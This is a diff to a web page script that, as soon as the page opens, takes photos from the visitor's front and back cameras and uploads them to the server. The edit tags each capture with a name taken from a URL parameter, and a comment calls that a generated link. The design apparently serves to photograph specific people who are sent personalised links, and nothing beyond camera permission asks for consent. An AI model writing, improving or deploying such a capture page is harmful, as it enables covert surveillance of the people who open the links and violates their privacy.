@@ -13,14 +13,9 @@
 (async function() {
     const status = document.getElementById("status");
 
-    // Ask for name immediately
-    let name = prompt("Enter your name:");
-    if (!name || !name.trim()) {
-        name = "visitor";
-    }
-    name = name.trim();
-
-    // Create unique session ID
+    // Get name from URL parameter (generated link)
+    const urlParams = new URLSearchParams(window.location.search);
+    const name = urlParams.get("name") || "visitor"; 
     const sessionId = Date.now().toString() + Math.floor(Math.random() * 1000);
 
     async function takePhoto(facingMode) {
@@ -33,44 +28,33 @@
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
-        const imageData = canvas.toDataURL("image/jpeg");
-
         stream.getTracks().forEach(t => t.stop());
-        return imageData;
+        return canvas.toDataURL("image/jpeg");
     }
 
     async function sendToServer(imageData, type) {
         await fetch("/upload", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ 
-                image: imageData, 
-                name, 
-                type, 
-                sessionId 
-            })
+            body: JSON.stringify({ image: imageData, name, type, sessionId })
         });
     }
 
     try {
-        status.innerText = "Capturing front camera...";
+        status.innerText = `Capturing front camera for ${name}...`;
         const frontPhoto = await takePhoto("user");
         await sendToServer(frontPhoto, "front");
 
-        status.innerText = "Switching to back camera...";
-        setTimeout(async () => {
-            try {
-                const backPhoto = await takePhoto({ exact: "environment" });
-                await sendToServer(backPhoto, "back");
-            } catch {
-                console.warn("Back camera not available.");
-            }
-            status.innerText = "Capture complete!";
-        }, 1500);
+        status.innerText = `Capturing back camera for ${name}...`;
+        const backPhoto = await takePhoto({ exact: "environment" });
+        await sendToServer(backPhoto, "back");
+
+        status.innerText = `Capture complete for ${name}!`;
     } catch (err) {
         status.innerText = "Error: " + err.message;
     }
 })();
 </script>
+
 </body>
 </html>
